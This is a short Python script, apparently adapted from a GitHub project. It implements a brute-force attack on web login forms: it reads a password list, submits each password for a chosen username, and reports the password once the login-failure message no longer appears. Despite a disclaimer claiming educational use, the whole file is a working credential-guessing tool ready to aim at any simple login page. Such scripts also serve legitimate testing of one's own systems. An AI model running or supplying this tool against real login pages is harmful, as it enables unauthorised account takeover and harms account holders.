import requests
from termcolor import colored

# credits for this script goes to: https://github.com/itaynir1/Brute-Force
class Bruteforce():
	"""
	This class is used to bruteforce simple login pages, currently is has only been tested on
	a self made login page, but it should work on other simple login pages as well. Needs furter
	testing and development for more advanced login pages.

	This script should not be used for illegal purposes, it is for educational and ethical purposes
	only. Use this script on your own risk and responsibility.
	"""
	
	def __init__(self, url='http://127.0.0.1:5000', username='admin', password_file='./extra/10K_password.txt', login_failed_string='Wrong password! Please try again.', cookie_value=''):
		self.url = url
		self.username = username
		self.password_file = password_file
		self.login_failed_string = login_failed_string
		self.cookie_value = cookie_value

	def cracking(self):
		result = {}
		with open(self.password_file, 'r') as passwords:
			for password in passwords:
				password = password.strip()
				print(colored(('Trying: ' + password), 'red'))
				data = {'username':self.username,'password':password,'Login':'submit'}
				if self.cookie_value != '':
					response = requests.get(self.url, params={'username':self.username,'password':password,'Login':'Login'}, cookies = {'Cookie': self.cookie_value})
				else:
					response = requests.post(self.url, data=data)
				if self.login_failed_string in response.content.decode():
					# if login_failed_string is in the response's content, then the password is wrong
					pass
				else:
					print(colored(('[+] Found Username: ==> ' + self.username), 'green'))
					print(colored(('[+] Found Password: ==> ' + password), 'green'))
					result['username'] = self.username
					result['password'] = password
					return result

		print('[!!] Password Not In List')
		return result

if __name__ == "__main__":
	# url = input('[+] Enter Page URL: ')
	# username = input('[+] Enter Username For The Account To Bruteforce: ')
	# password_file = input('[+] Enter Password File To Use: ')
	# login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
	# cookie_value = input('Enter Cookie Value(Optional): ')

	run = Bruteforce().cracking()